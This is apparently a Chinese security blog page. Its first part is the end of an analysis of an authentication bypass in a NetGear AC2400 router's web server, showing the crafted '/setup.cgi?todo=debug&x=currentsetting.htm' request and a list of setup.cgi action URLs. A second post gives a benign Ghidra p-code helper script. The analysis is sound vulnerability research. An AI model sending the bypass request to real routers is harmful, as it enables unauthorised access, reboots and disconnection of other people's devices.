class="string">"mini_httpd.c"</span>, <span class="string">"do_file"</span>, 2539);</span><br><span class="line">    fprintf(</span><br><span class="line">      v14,</span><br><span class="line">      <span class="string">"no need verify for no auth or soap or genie.cgi, %d, %d, %s, %s, %s\n"</span>,</span><br><span class="line">      what_2,</span><br><span class="line">      is_setup_wizard,</span><br><span class="line">      v7,</span><br><span class="line">      v8,</span><br><span class="line">      authorization);</span><br><span class="line">    v15 = v14;</span><br><span class="line">    goto LABEL_42;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 满足if时，会"no need verify for no auth or soap or genie.cgi"</span></span><br><span class="line"><span class="comment"># 而经过my_handle_request中，what_2会=0，而is_setup_wizard会=1，满足</span></span><br></pre></td></tr></table></figure>
<h2 id="04-认证绕过"><a href="#04-认证绕过" class="headerlink" title="04-认证绕过"></a>04-认证绕过</h2><ul>
<li>某些接口确实不需要权限验证就能访问，但是在实现这项功能时使用了 strstr 而不是精确匹配，导致出现绕过的问题</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( strstr(path_1, <span class="string">"currentsetting.htm"</span>) )</span><br><span class="line">	is_setup_wizard = 1;<span class="comment"># 两层if都要满足</span></span><br></pre></td></tr></table></figure>
<ul>
<li>AC2400 存在一个可以开启 debug 模式的接口：/setup.cgi?todo=debug</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接访问，401</span></span><br><span class="line"><span class="comment"># /setup.cgi?todo=debug&amp;x=currentsetting.htm，绕过认证</span></span><br></pre></td></tr></table></figure>
<ul>
<li>绕过逻辑</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使my_handle_request中is_setup_wizard=1，what_2=0</span></span><br><span class="line"><span class="comment"># 使my_auth_check中进入正常login的流程</span></span><br><span class="line"><span class="comment"># 使my_do_file中可打印no_need_verify那条语句</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意：比较片面化，没有从用户输入到绕过的完整处理路径</li>
</ul>
<h2 id="05-其他"><a href="#05-其他" class="headerlink" title="05-其他"></a>05-其他</h2><ul>
<li>通过特定代码段，来判定函数名</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 好像是一个报错的信息，哪个文件的哪个函数的哪一行</span></span><br><span class="line"><span class="comment"># 通过此，可判定函数名，handle_request</span></span><br><span class="line">v4 = (FILE *)fopen64(<span class="string">"/dev/console"</span>, <span class="string">"a+"</span>);</span><br><span class="line"><span class="keyword">if</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  fprintf(v4, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"handle_request"</span>, 1634);</span><br><span class="line">  fputs(<span class="string">"read\n"</span>, v4);</span><br><span class="line">  fclose(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过“源码+报错”方式找到如下函数</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fprintf(v3, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"cgi_interpose_output"</span>, 3098);</span><br><span class="line">fprintf(v37, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"make_envp"</span>, 3387);</span><br><span class="line">fprintf(v15, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"add_headers"</span>, 4129);</span><br><span class="line">fprintf(v6, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"auth_check"</span>, 3487);</span><br><span class="line">fprintf(v4, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"do_file"</span>, 2515);</span><br><span class="line">fprintf(fp_console, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"handle_request"</span>, 1639);</span><br></pre></td></tr></table></figure>
<ul>
<li>其他可用链接，<a href="https://gist.github.com/Donearm/978555" target="_blank" rel="noopener">https://gist.github.com/Donearm/978555</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注：对于不同型号的设备，能够绕过验证的功能不完全一致，某些可以用于 GET 请求，另一些可能只对 POST 请求有效。某些可能只对 htm 页面有效，其它只对 cgi 有效。</span></span><br><span class="line"></span><br><span class="line">DEBUGURL = <span class="string">'http://192.168.0.1/setup.cgi?todo=debug'</span></span><br><span class="line">REBOOTURL = <span class="string">'http://192.168.0.1/setup.cgi?next_file=diag.htm&amp;todo=reboot'</span></span><br><span class="line"><span class="comment">#DISCONNECTURL = 'http://192.168.0.1/setup.cgi?todo=disconnect&amp;this_file=st_poe.htm&amp;next_file=st_poe.htm'</span></span><br><span class="line">DISCONNECTURL = <span class="string">'http://192.168.0.1/setup.cgi?todo=disconnect'</span></span><br><span class="line"><span class="comment">#CONNECTURL = 'http://192.168.0.1/setup.cgi?todo=connect&amp;this_file=st_poe.htm&amp;next_file=st_poe.htm'</span></span><br><span class="line">CONNECTURL = <span class="string">'http://192.168.0.1/setup.cgi?todo=connect'</span></span><br><span class="line">STATTBLURL = <span class="string">'http://192.168.0.1/setup.cgi?next_file=stattbl.htm'</span></span><br><span class="line">LOGOUTURL = <span class="string">'http://192.168.0.1/setup.cgi?todo=logout'</span></span><br><span class="line">INTERVALURL = <span class="string">'http://192.168.0.1/setup.cgi?next_file=interval.htm'</span></span><br><span class="line">STATUSURL = <span class="string">'http://192.168.0.1/setup.cgi?next_file=s_status.htm'</span></span><br></pre></td></tr></table></figure>
<ul>
<li>此外，NetGear 存在某些历史漏洞，也是登录验证绕过，触发方法是在 URL 中添加空字节或者添加 1.jpg 等字符串，参考链接</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zer0yu/CVE_Request/tree/master/netgear</span><br><span class="line">https://www.zerodayinitiative.com/advisories/ZDI-19-866/</span><br></pre></td></tr></table></figure>
<ul>
<li>//here</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">在这个函数中还存在一些登录逻辑，相关代码如下</span><br><span class="line"></span><br><span class="line">strlcpy(v101, dword_429734, 10000);</span><br><span class="line">  v0 = strrchr(v101, 47);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    *v0 = 0;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    strlcpy(v101, <span class="string">"."</span>, 10000);</span><br><span class="line">  <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">  &#123;</span><br><span class="line">    usb_auth_check(v101);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( login_or_not )</span><br><span class="line">  &#123;</span><br><span class="line">    maybe_login(v101);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  判断了 login_or_not 变量，如果不等于 0 就执行 login，同上，当构造满足特定要求的请求时，login_or_not 会被设置成 0，也能绕过这个逻辑。</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://wzt.ac.cn/2021/01/13/AC2400_vuln/" target="_blank" rel="noopener">https://wzt.ac.cn/2021/01/13/AC2400_vuln/</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/07/19/reverse/ida-ghidra使用记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/19/reverse/ida-ghidra使用记录/" class="post-title-link" itemprop="url">ida-ghidra使用记录</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-19 14:41:33" itemprop="dateCreated datePublished" datetime="2021-07-19T14:41:33+08:00">2021-07-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 15:43:47" itemprop="dateModified" datetime="2022-02-21T15:43:47+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/软件安全-逆向/" itemprop="url" rel="index"><span itemprop="name">软件安全/逆向</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="ida-ghidra使用记录"><a href="#ida-ghidra使用记录" class="headerlink" title="ida-ghidra使用记录"></a>ida-ghidra使用记录</h1><h1 id="ghidra"><a href="#ghidra" class="headerlink" title="ghidra"></a>ghidra</h1><h2 id="00-tool-py"><a href="#00-tool-py" class="headerlink" title="00-tool.py"></a>00-tool.py</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tool kit</span></span><br><span class="line"><span class="comment"># @author lxl</span></span><br><span class="line"><span class="comment"># @category my_python_script</span></span><br><span class="line"><span class="comment"># @keybinding</span></span><br><span class="line"><span class="comment"># @menupath</span></span><br><span class="line"><span class="comment"># @toolbar</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TODO Add User Code Here</span></span><br><span class="line"></span><br><span class="line">from __main__ import *</span><br><span class="line">from ghidra.app.decompiler import DecompInterface</span><br><span class="line">from ghidra.program.model.pcode import PcodeOp</span><br><span class="line"></span><br><span class="line">def get_varnode_value(varnode):</span><br><span class="line">    <span class="keyword">if</span> varnode.isAddress() or varnode.isConstant():</span><br><span class="line">        <span class="built_in">return</span> varnode.getAddress()</span><br><span class="line">    <span class="keyword">elif</span> varnode.isUnique() or varnode.isAddrTied() or varnode.isRegister():</span><br><span class="line">        <span class="built_in">return</span> calc_pcode_op(varnode.getDef())</span><br><span class="line">    <span class="keyword">elif</span> varnode.isPersistant() or varnode.isUnaffected():</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">def calc_pcode_op(p_code):</span><br><span class="line">    op_code = p_code.getOpcode()</span><br><span class="line">    <span class="comment"># PTRSUB</span></span><br><span class="line">    <span class="keyword">if</span> op_code == PcodeOp.PTRSUB:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: PTRSUB" % p_code)</span></span><br><span class="line">        value_1 = get_varnode_value(p_code.getInput(0))</span><br><span class="line">        value_2 = get_varnode_value(p_code.getInput(1))</span><br><span class="line">        <span class="keyword">if</span> isinstance(value_1, GenericAddress) and isinstance(value_2, GenericAddress):</span><br><span class="line">            <span class="built_in">return</span> value_1.offset + value_2.offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print("value_1: &#123;&#125;".format(value_1))</span></span><br><span class="line">            <span class="comment"># print("value_2: &#123;&#125;".format(value_2))</span></span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># CAST</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.CAST:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: CAST" % p_code)</span></span><br><span class="line">        value_0 = get_varnode_value(p_code.getInput(0))</span><br><span class="line">        <span class="keyword">if</span> isinstance(value_0, GenericAddress):</span><br><span class="line">            <span class="built_in">return</span> value_0.offset</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># PTRADD</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.PTRADD:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: PTRADD" % p_code)</span></span><br><span class="line">        try:</span><br><span class="line">            value_0_point = get_varnode_value(p_code.getInput(0))</span><br><span class="line">            <span class="comment"># print("value_0_point: &#123;&#125;".format(value_0_point))</span></span><br><span class="line">            <span class="keyword">if</span> not isinstance(value_0_point, GenericAddress):</span><br><span class="line">                <span class="built_in">return</span></span><br><span class="line">            value_0 = toAddr(getInt(value_0_point))</span><br><span class="line">            <span class="comment"># print("value_0: &#123;&#125;".format(value_0))</span></span><br><span class="line">            <span class="comment"># print("type(value_0): &#123;&#125;".format(type(value_0)))</span></span><br><span class="line">            value_1 = get_varnode_value(p_code.getInput(1))</span><br><span class="line">            <span class="comment"># print("value_1: &#123;&#125;".format(value_1))</span></span><br><span class="line">            <span class="comment"># print("type(value_1): &#123;&#125;".format(type(value_1)))</span></span><br><span class="line">            <span class="keyword">if</span> not isinstance(value_1, GenericAddress):</span><br><span class="line">                <span class="comment"># print("value_1 is not GenericAddress!")</span></span><br><span class="line">                <span class="built_in">return</span></span><br><span class="line">            value_1 = get_signed_value(value_1.offset)</span><br><span class="line">            value_2 = get_varnode_value(p_code.getInput(2))</span><br><span class="line">            <span class="comment"># print("value_2: &#123;&#125;".format(value_2))</span></span><br><span class="line">            <span class="comment"># print("type(value_2): &#123;&#125;".format(type(value_2)))</span></span><br><span class="line">            <span class="keyword">if</span> not isinstance(value_2, GenericAddress):</span><br><span class="line">                <span class="built_in">return</span></span><br><span class="line">            output_value = value_0.add(value_1)</span><br><span class="line">            <span class="comment"># print("output_value: &#123;&#125;".format(output_value))</span></span><br><span class="line">            <span class="built_in">return</span> output_value.offset</span><br><span class="line"></span><br><span class="line">        except Exception as err:</span><br><span class="line">            <span class="comment"># print("Got something wrong with calc PcodeOp.PTRADD : &#123;&#125;".format(err))</span></span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line"></span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Got something wrong with calc PcodeOp.PTRADD "</span>)</span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># INDIRECT</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.INDIRECT:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: INDIRECT" % p_code)</span></span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># MULTIEQUAL</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.MULTIEQUAL:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: MULTIEQUAL" % p_code)</span></span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line">    <span class="comment"># COPY</span></span><br><span class="line">    <span class="keyword">elif</span> op_code == PcodeOp.COPY:</span><br><span class="line">        <span class="comment"># print("p_code: %s, op_code: COPY" % p_code)</span></span><br><span class="line">        <span class="comment"># print("input_0: %s, output: %s" % (p_code.getInput(0), p_code.getOutput()))</span></span><br><span class="line">        value = get_varnode_value(p_code.getInput(0))</span><br><span class="line">        <span class="built_in">return</span> value</span><br><span class="line">class FuncParser(object):</span><br><span class="line">    def __init__(self, func):</span><br><span class="line">        self.func = func</span><br><span class="line">        self.pcode_dict = self.get_all_pcode()</span><br><span class="line"></span><br><span class="line">    def get_all_pcode(self):</span><br><span class="line">        dec_lib = DecompInterface()</span><br><span class="line">        dec_lib.openProgram(currentProgram)</span><br><span class="line">        dec_res = dec_lib.decompileFunction(self.func, 30, getMonitor())</span><br><span class="line">        high_func = dec_res.getHighFunction()</span><br><span class="line">        ops = high_func.getPcodeOps()</span><br><span class="line"></span><br><span class="line">        pcode_dict = &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span> ops.hasNext():</span><br><span class="line">            p_code = ops.next()</span><br><span class="line">            op_code = p_code.getOpcode()</span><br><span class="line">            <span class="keyword">if</span> op_code not <span class="keyword">in</span> [PcodeOp.CALL, PcodeOp.CALLIND]:</span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            caller_addr = p_code.getInput(0).getPCAddress()</span><br><span class="line">            pcode_dict[caller_addr] = p_code</span><br><span class="line">        <span class="built_in">return</span> pcode_dict</span><br><span class="line"></span><br><span class="line">    def get_arg_list(self, caller_addr):</span><br><span class="line">        arg_list = []</span><br><span class="line">        p_code = self.pcode_dict[caller_addr]</span><br><span class="line">        args = p_code.getInputs()[1:]</span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">            arg_list.append(arg)</span><br><span class="line">        <span class="built_in">return</span> arg_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def is_addr_in_cur_program(addr):</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> currentProgram.memory.blocks:</span><br><span class="line">        <span class="keyword">if</span> block.getStart().offset &lt;= addr.offset &lt;= block.getEnd().offset:</span><br><span class="line">            <span class="built_in">return</span> True</span><br><span class="line">    <span class="built_in">return</span> False</span><br><span class="line"></span><br><span class="line">def get_arg_list(pcode_dict, caller_addr):</span><br><span class="line">    arg_list = []</span><br><span class="line">    p_code = pcode_dict[caller_addr]</span><br><span class="line">    args = p_code.getInputs()[1:]</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        arg_list.append(arg)</span><br><span class="line">    <span class="built_in">return</span> arg_list</span><br><span class="line"></span><br><span class="line">def get_func_pcode(func):</span><br><span class="line">    dec_lib = DecompInterface()</span><br><span class="line">    dec_lib.openProgram(currentProgram)</span><br><span class="line">    dec_res = dec_lib.decompileFunction(func, 30, getMonitor())</span><br><span class="line">    high_func = dec_res.getHighFunction()</span><br><span class="line">    ops = high_func.getPcodeOps()</span><br><span class="line"></span><br><span class="line">    pcode_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> ops.hasNext():</span><br><span class="line">        p_code = ops.next()</span><br><span class="line">        op_code = p_code.getOpcode()</span><br><span class="line">        <span class="keyword">if</span> op_code not <span class="keyword">in</span> [PcodeOp.CALL, PcodeOp.CALLIND]:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        caller_addr = p_code.getInput(0).getPCAddress()</span><br><span class="line">        pcode_dict[caller_addr] = p_code</span><br><span class="line">    <span class="built_in">return</span> pcode_dict</span><br><span class="line"></span><br><span class="line">def trace_varnode_value(varnode):</span><br><span class="line">    <span class="keyword">while</span> not varnode.isConstant():</span><br><span class="line">        pcode_op = varnode.getDef()</span><br><span class="line">        op_code = pcode_op.getOpcode()</span><br><span class="line">        <span class="keyword">if</span> pcode_op is None:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">elif</span> op_code <span class="keyword">in</span> [PcodeOp.CAST, PcodeOp.COPY]:</span><br><span class="line">            varnode = pcode_op.getInput(0)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">elif</span> op_code <span class="keyword">in</span> [PcodeOp.PTRSUB, PcodeOp.PTRADD]:</span><br><span class="line">            varnode = pcode_op.getInput(1)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">elif</span> op_code <span class="keyword">in</span> [PcodeOp.INT_MULT, PcodeOp.MULTIEQUAL]:</span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> None</span><br><span class="line">    <span class="built_in">return</span> varnode.getOffset()</span><br><span class="line"></span><br><span class="line">def get_string_by_addr(addr):</span><br><span class="line">    mem = currentProgram.getMemory()</span><br><span class="line">    core_name_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        byte = mem.getByte(addr.add(len(core_name_str)))</span><br><span class="line">        <span class="keyword">if</span> byte == 0:</span><br><span class="line">            <span class="built_in">return</span> core_name_str</span><br><span class="line">        core_name_str += chr(byte)</span><br><span class="line"></span><br><span class="line">def get_arg_value(arg_list, arg_index):</span><br><span class="line">    arg = arg_list[arg_index - 1]</span><br><span class="line">    value = trace_varnode_value(arg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># None</span></span><br><span class="line">    <span class="keyword">if</span> not value:</span><br><span class="line">        <span class="built_in">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># char* or int</span></span><br><span class="line">    arg_value = 0</span><br><span class="line">    arg_addr = toAddr(value)</span><br><span class="line">    <span class="keyword">if</span> is_addr_in_cur_program(arg_addr):</span><br><span class="line">        <span class="keyword">if</span> getDataAt(arg_addr):</span><br><span class="line">            arg_value = get_string_by_addr(arg_addr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            arg_value = value</span><br><span class="line">    <span class="built_in">return</span> arg_value</span><br><span class="line"></span><br><span class="line">def get_caller_dict(target_func):</span><br><span class="line">    caller_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    entry_point = target_func.getEntryPoint()</span><br><span class="line">    refs = getReferencesTo(entry_point)</span><br><span class="line">    <span class="keyword">for</span> ref <span class="keyword">in</span> refs:</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        ref_type = ref.getReferenceType()</span><br><span class="line">        <span class="keyword">if</span> not ref_type.isCall():</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        caller_addr = ref.getFromAddress()</span><br><span class="line">        caller_func = getFunctionContaining(caller_addr)</span><br><span class="line">        <span class="comment"># if caller_func.name != "FUN_00406398"://here</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line"></span><br><span class="line">        pcode_dict = get_func_pcode(caller_func)</span><br><span class="line">        arg_list = get_arg_list(pcode_dict, caller_addr)</span><br><span class="line">        caller_dict[caller_addr] = &#123;</span><br><span class="line">            <span class="string">'caller_func'</span>: caller_func.name,</span><br><span class="line">            <span class="comment"># 'caller_func_addr': caller_func.getEntryPoint(),</span></span><br><span class="line">            <span class="string">'args'</span>: arg_list</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">return</span> caller_dict</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
